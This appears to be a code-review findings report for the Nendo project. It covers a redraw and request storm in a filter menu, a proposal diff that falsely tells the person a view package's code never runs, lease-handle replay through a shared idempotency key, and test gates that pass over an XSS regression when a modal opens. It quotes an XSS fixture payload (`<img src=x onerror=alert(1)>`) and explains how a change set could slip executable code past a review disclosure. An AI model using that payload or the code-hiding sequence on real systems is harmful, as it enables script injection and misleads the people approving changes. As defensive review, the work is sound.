- **Where:** `src/Nendo.Workbench/src/quick-filter.ts:33`, `src/Nendo.Workbench/src/quick-filter.ts:88`, `src/Nendo.Workbench/src/quick-filter.ts:104`, `src/Nendo.Workbench/src/quick-filter.ts:27`
- **What:** wireQuickFilter attaches a 'toggle' listener that calls readTargets(plan) whenever menu.open is true. readTargets sets every reference target to {state:'loading'} and calls rerender() synchronously, and quickFilterMenu draws the menu with the open attribute because openSurfaceId is set. Chromium queues a toggle event for a <details> inserted with open (record-form.ts:198 already guards against exactly this for folds), so the new menu's listener fires, calls readTargets again, which redraws again, and so on. Nothing records that a read is already loading, and there is no 'drawn' guard as wireFolds has. readTargets returns early only when the screen has no reference field, so choice-only screens are unaffected.
- **Failure:** A list or board of Issues with a Debate reference field: the person clicks Filter once. The page is redrawn on every task turn and each redraw issues another data.queryRecords per reference field, without end while the menu is open. The selects inside the menu are replaced continuously, so a native dropdown closes under the pointer and a pick is hard or impossible; the Engine gate is flooded with reads.
- **Reproduction:** Executed: build-quickfilter-probe.mjs bundles the real quick-filter.ts (app-state/client/shell/reads stubbed) and quick-filter-probe.html opens the menu once in headless Edge with a 500-render cap -> "renders after one open=1000 requests=500" (the loop stopped only at the probe's cap). toggle-probe.html confirms the platform behaviour: "toggles=50 renders=50" for a details redrawn open from its own toggle handler.
- **Fix and guard:** Guard the listener the way wireFolds does: remember the drawn state (let drawn = menu.open) and return when the toggle merely reports the state the markup was drawn with; and make readTargets skip a target that is already loading or ready for the current change sequence. Guard: a headless-browser lane (or the authoring gate) that opens Filter on a screen with a reference field and asserts exactly one data.queryRecords per reference target and a bounded number of redraws; falsify by removing the drawn check.
- **Verifier:** Traced end to end. quick-filter.ts:33-35 calls readTargets on every toggle while menu.open. readTargets sets each reference target to loading and calls rerender() synchronously (:87-88), then calls it again after the reads (:104). There is no in-flight or already-read guard. rerender runs renderUse, which rebuilds content.innerHTML wholesale (view-use.ts:169-170) with <details ... open> because openSurfaceId is still set (quick-filter.ts:27, quick-filter-model.ts:117). It then re-wires the listener (view-use.ts:234). Chromium fires toggle on a details inserted open, which the codebase already documents and guards against in wireFolds (record-form.ts:198-203), so every redraw triggers another readTargets. Only quickFilterFields screens with a bound reference reach it (:86), and those are offered on list, board and matrix screens (quick-filter-model.ts:26,36-46). I re-ran the reviewer's headless Edge probe, which bundles the unchanged HEAD quick-filter.ts (last touched df81c75, no working-tree change). It printed 'renders after one open=1000 requests=500', stopping only at the probe's cap, and the platform probe printed 'toggles=50 renders=50'. No lane exercises the toggle path. quick-filter.test.mjs and quick-filter-refresh.test.mjs stub content and rerender, and WorkbenchQuickFilterTests.cs is host-level.
- **Correction:** Add view-use.ts:169-170 and :234 (the wholesale innerHTML redraw and re-wire) and quick-filter-model.ts:117 (the open attribute) to the locations. The storm is worse than linear. Every redrawn menu fires its own toggle, including one already detached, which yields one read per redraw. Every readTargets yields two redraws, so in-flight data.queryRecords requests grow geometrically while the menu stays open. That could amount to a Workbench hang, but that was not measured, so P1 stands. The fix is right: let drawn = menu.open, and return when fold.open === drawn, as wireFolds does.

### ESM-02 — The proposal review hides that code will run when a skill package is removed and re-created as a view package under the same ID, and instead tells the person Nendo never runs it

**P2** · security · Confirmed · area `engine-semantics` (reported P1)

- **Where:** `src/Nendo.Engine/SemanticDiff.cs:371`, `src/Nendo.Engine/SemanticDiff.cs:337`, `src/Nendo.Engine/SemanticDiff.cs:295`, `src/Nendo.Engine/SemanticDiff.cs:302`
- **What:** PackageState.Remove drops the title but never removes the package ID from _skills, and Set only ever adds to _skills. The extensionCode and extensionSkill lines are decided after the loop with packages.IsSkill(put.PackageId) against that final state. Storage allows the sequence in one mutation: ExecuteRemoveExtensionPackageAsync deletes the __nendo_extension_kind row, and ExecuteSetExtensionPackageAsync then creates a view package with the same ID (the 'a package keeps its kind' guard only applies while the old package exists).
- **Failure:** The file holds skill package pkg.notes with SKILL.md. A change set removes SKILL.md, removes pkg.notes, sets pkg.notes again without kind (a view package) and puts index.html containing script that reaches the network. The accept gate omits 'This code runs when a view that uses its package is shown ... reach the network and use the clipboard' and adds 'These are instructions for an agent working on this file. Nendo never runs them'. The person accepts executable code on a false statement; an agent can use the sequence to launder code past the one disclosure the gate carries.
- **Reproduction:** Executed: probe-diff.ps1 case 1 -> '[setExtensionPackage] Add the custom-view package Notes (pkg.notes), starting at index.html. Its code is kept in this file.' / '[putExtensionFile] Add index.html to the package Notes (text/html, 66 bytes).' / '[extensionSkill] These are instructions for an agent working on this file. Nendo never runs them; ...' with no extensionCode line; case 2 (same change set, package not in the file) -> '[extensionCode] This code runs when a view that uses its package is shown. It can read and change this file's records through Nendo, reach the network and use the clipboard.'
- **Fix and guard:** Classify each PutExtensionFileOperation inside the loop against the package state at that point, and make PackageState.Remove call _skills.Remove(packageId) and Set remove the ID from _skills for a view kind. Guard: SemanticDiff tests for remove-then-recreate-as-view (and the reverse) asserting extensionCode present and extensionSkill absent; falsify by restoring the old Remove.
- **Verifier:** The code does what is claimed. PackageState.Remove (src/Nendo.Engine/SemanticDiff.cs:371-376) drops only the title, Set (337-353) only ever adds to _skills, and the extensionCode/extensionSkill lines are decided after the loop against that stale set (295-309). Storage accepts the sequence: ExecuteRemoveExtensionPackageAsync deletes the kind row (SqliteNendoStore.ExtensionPackages.cs:259-264), so ExecuteSetExtensionPackageAsync reads previous=null and skips the kind guard (205-210, whose message even says 'or remove this package first'). The clone-side SKILL.md check covers only packages that are still skills (NendoWriteCoordinator.Proposals.cs:378-394), and MCP exposes all four operations (NendoAuthoringOperations.cs:117-127). I re-ran the reviewer's SemanticDiff probe (verify/engine-semantics-2/probe-v.ps1). Case 1 printed extensionSkill ('Nendo never runs them') and no extensionCode. The fresh-add control printed extensionCode. The contract's grant line (docs/contracts/custom-views.md:179-182) is therefore missing, and a false line takes its place. I lowered it to P2 for three reasons. The trigger is narrow: one agent-authored change set has to combine the removal and the re-creation, and the archive importer cannot produce it (NendoExtensionArchives.ChangeSet issues no removePackage, so the kind guard refuses it). The review still says 'Add the custom-view package ... Its code is kept in this file' and shows the full code diff in packageChanges. The code only runs once a view names the package, and that view gets its own diff line.
- **Correction:** 'Hides that code will run' overstates it. The review contradicts itself rather than staying silent. The setExtensionPackage line still says the custom-view package's code is kept in the file, and packageChangesMarkup shows the script. The Workbench proposal page aside (src/Nendo.Workbench/src/view-proposal.ts:28) also says 'once you accept, it runs wherever a screen or a record page shows its view' whenever packageChanges adds files. The agent proposal page (view-agent.ts:359) has no such aside. What is actually missing is the ADR-0013 grant sentence (network, clipboard, records), and the false extensionSkill line is added. Fix: having Remove call _skills.Remove(packageId) and a view-kind Set remove the ID from _skills is enough. Files have to be removed before their package, so classifying against the final state stays correct, and per-put classification inside the loop is optional. Guard: a SemanticDiff test for skill-to-view re-creation that asserts extensionCode is present and extensionSkill absent, falsified by restoring the old Remove.

### MHS-02 — nendo.lease.acquire replays the holder's grant, application handle included, to any client that sends the same idempotencyKey

**P2** · security · Confirmed · area `mcp-host-security` (reported P1)

- **Where:** `src/Nendo.LocalMcp/NendoAgentAuthority.cs:245`, `src/Nendo.LocalMcp/NendoLeaseTools.cs:22`, `src/Nendo.LocalMcp/NendoHostSkill.cs:150`, `docs/contracts/mcp-interface.md:246`
- **What:** In AcquireAsync, when a lease is active, `if (idempotencyKey is not null && Active.AcquireKey == idempotencyKey) return Active.Grant;` returns the whole grant: LeaseId, ApplicationHandle and ReceiptContext. Nothing ties the key to the caller, the key never expires while the lease is held, and no minimum entropy is required; the parameter is described as an 'Optional stable key for this acquire'. The host skill tells every agent to 'Call `nendo.lease.acquire` with an `idempotencyKey`' and says nothing about uniqueness. ADR-0009 calls the handle a capability that must stay private, and allows at most one modifying owner.
- **Failure:** Codex holds the planner's lease, acquired with idempotencyKey "acquire-lease". Claude Code, following the same skill, calls acquire with "acquire-lease". It receives Codex's leaseId and applicationHandle instead of NENDO_LEASE_HELD. Both agents now write under one pseudonym, while the Agent page and nendo.lease.status still name only Codex. Either agent can undo_revision the other's writes. When either one releases, the other's lease ends and its unvalidated drafts are discarded, because DiscardSessionAsync is keyed by the handle. The single-lease serialization that the planner workflow relies on is gone.
- **Reproduction:** Executed: probe-acquire-key.ps1, which calls NendoAgentAuthority.AcquireAsync from the HEAD payload by reflection. Output: `Codex key=acquire-lease -> leaseId=ca003d05b93a.. handle=aaaaaaaaaaaa.. owner=agent-ffe054fe7ae0` / `Claude Code key=acquire-lease -> leaseId=ca003d05b93a.. handle=aaaaaaaaaaaa.. owner=agent-ffe054fe7ae0` / `Copilot key=something-else -> ... "Another local agent currently has edit access."`
- **Fix and guard:** Make a replay prove it is the lost response. Replay only while no owned call has used the lease (set a used flag in AdmitMutationAsync, RenewAsync and ReleaseAsync), and only within a short window after the grant. Also require a high-entropy key, for example 32 characters or more, and say 'a fresh random value per acquire' in the parameter text and in the skill. Guard: a LeaseProtocolTests case in which client B acquires with A's key after A has made one owned call, asserting NENDO_LEASE_HELD. The existing immediate-retry replay test must keep passing.
- **Verifier:** Traced end to end: NendoLeaseTools.cs:22-30 passes the caller's idempotencyKey through unchanged with a fresh handle, and NendoAgentAuthority.cs:245-248 returns Active.Grant (LeaseId, ApplicationHandle, ReceiptContext) to any caller whose key equals Active.AcquireKey. Nothing binds the key to a caller, and NendoText.RequireText only bounds its length. No ADR or contract accepts a collision between clients: mcp-interface.md:246-249 promises only that an 'exact retry' gets the same grant, and ADR-0009:297-301 calls the handle a capability. The host skill (NendoHostSkill.cs:150) asks for a key but not a unique one, and the project's own test uses 'acquire-1' (LeaseResumeTests.cs:27). Priority goes down from P1. ADR-0009:276-285 makes the machine the boundary ('not an anti-malware boundary'), and any local process can acquire whenever the lease is free, so a hostile guesser is outside the threat model. What is left is two cooperating agents choosing the same key and silently sharing one lease, pseudonym and draft scope. That is real but needs a collision, and unique keys avoid it.
- **Correction:** Recategorise from security to coordination/correctness. Under ADR-0009's same-machine posture the lease is not a security boundary against local processes, so the impact is accidental co-holding, not a breach. Extra evidence: the LEASE_HELD refusal (NendoToolErrors.cs:150-154) and help-agents.ts:86 both tell agents to repeat the same idempotencyKey, and site/src/content/docs/agents.md:72 also describes the key without asking for uniqueness. The fix should update those texts and mcp-interface.md:246-249 together with the skill and the parameter description.

### TGA-01 — Five custom-view lanes in Test-Production pass when the probe stops at a modal, so the XSS check they carry fails open

**P2** · security · Confirmed · area `tools-gates` (reported P1)

- **Where:** `tools/Review-NendoGraph.ps1:34`, `tools/Review-WorkDependencies.ps1:34`, `tools/Review-SystemsLens.ps1:34`, `tools/Review-Gantt.ps1:37`, `tools/Review-BcmAtlas.ps1:48`, `tools/Gate-DependencyGraph.mjs:77`, `tools/Gate-DependencyGraph.mjs:115`, `tools/Gate-Gantt.mjs:75`
- **What:** Each of these lanes runs `npx.cmd ... playwright-cli run-code --filename $probePath` and judges the result only by `$LASTEXITCODE -ne 0`. It never captures the output or requires the probe's own end marker. Each probe does return one ('dependency graph' JSON, 'work dependencies ok', 'systems lens ok', 'gantt ok', 'bcm-atlas ok'). playwright-cli ends run-code early and exits 0 when a dialog opens. The fixture broker frames every view with `allow-modals` (Graph-FixtureBroker.html:57), the same as production. Four probes feed a record label `<img src=x onerror=alert(1)>` and then assert `view.locator('img').count() === 0` ('A record label became markup.'). Review-ArchiWorkbench, Review-Garden, Review-Swarm and Review-AgentChat already require the completion mark (W-120). These five do not.
- **Failure:** A regression makes a view render a label through innerHTML. The fixture's `onerror=alert(1)` opens an alert inside the view frame before the markup assertion runs. playwright-cli reports 'Modal state' and exits 0. Review-NendoGraph.ps1 sees exit 0, and Test-Production prints 'Production verification passed.' over a stored-XSS defect. The same happens to any assertion after the Atlas's real `confirm('Discard your unsaved changes?')` (bcm-atlas/view.js:976) if a probe step closes a dirty editor through the view's own control.
- **Reproduction:** Executed: copied extensions/dependency-graph to the scratch folder and changed graph.js `button.textContent = node.label` to `button.innerHTML = node.label`. Ran Graph-FixtureServer.mjs plus Gate-DependencyGraph.mjs through playwright-cli exactly as Review-NendoGraph.ps1 does, with outputs in scratch -> "run-code exit (what Review-NendoGraph.ps1 judges): 0". The output has no '### Result' section and ends with '### Modal state - ["alert" dialog with message "1"]'. The unmodified control run also exited 0, but its output begins '### Result "{\"nodes\":3,\"edges\":4,...'. A minimal probe that opens an alert and then throws also exited 0, while the same throw without a modal exited 1.
- **Fix and guard:** Capture run-code output the way Review-Garden.ps1 does: `$ran = & npx.cmd ... 2>&1 \| Out-String`. Fail unless a '### Result' section carries the probe's end marker; better, have every probe return `{ complete: true, ... }`. Also fail when the output contains '### Modal state'. In each probe, register `page.on('dialog', d => { errors.push('dialog: ' + d.message()); d.dismiss(); })` so a modal becomes an assertion failure, not an early exit. Guard: rerun the innerHTML falsification above against each of the five lanes and quote each lane failing.
- **Verifier:** The five lanes judge run-code only by $LASTEXITCODE (Review-NendoGraph.ps1:34-35, Review-WorkDependencies.ps1:34-35, Review-SystemsLens.ps1:34-35, Review-Gantt.ps1:37-38, Review-BcmAtlas.ps1:48-49), and Test-Production.ps1:389-393 judges each lane only by the pwsh exit code (Invoke-Checked, :25-27). None of the five probes registers a dialog handler, and the broker frames views with allow-modals (Graph-FixtureBroker.html:57). Four probes carry the onerror=alert label and assert after it (Gate-DependencyGraph.mjs:77/115, Gate-WorkDependencies.mjs:87/107, Gate-SystemsLens.mjs:114/140, Gate-Gantt.mjs:75/101). I reproduced the core mechanism myself in verify/tools-gates-1: playwright-cli@0.1.21 run-code that opens an alert in a sandboxed iframe and then throws exited 0 and printed '### Modal state'. The same throw with no modal exited 1. The reviewer's out-xss/run.log, from the real Gate-DependencyGraph probe against an innerHTML copy of graph.js, ends in Modal state with no Result section. Review-Garden/Swarm/AgentChat/ArchiWorkbench already require the completion mark. Priority lowered to P2: this is a gate that passes when it should fail on one regression class. There is no XSS in the product today, and non-modal failures still fail the lane.
- **Correction:** The Atlas confirm scenario cannot happen today. Gate-BcmAtlas.mjs closes the editor with document.getElementById('editor').close() (lines 581, 620, 707), which bypasses closeEditor's confirm (bcm-atlas/view.js:975-977). Gate-BcmAtlas also has no markup-label fixture. For the Atlas, then, this is only a missing completion mark that a future modal would turn into a false pass. The XSS assertion lines are 115/107/140/101, not the fixture lines cited for three of the probes. Attributing the completion-mark lanes to 'W-120' looks wrong: W-120 is .archimate open/save (docs/design/archi-in-nendo.md:112). Review-ArchiWorkbench matches complete:true by regex rather than a '### Result' section.
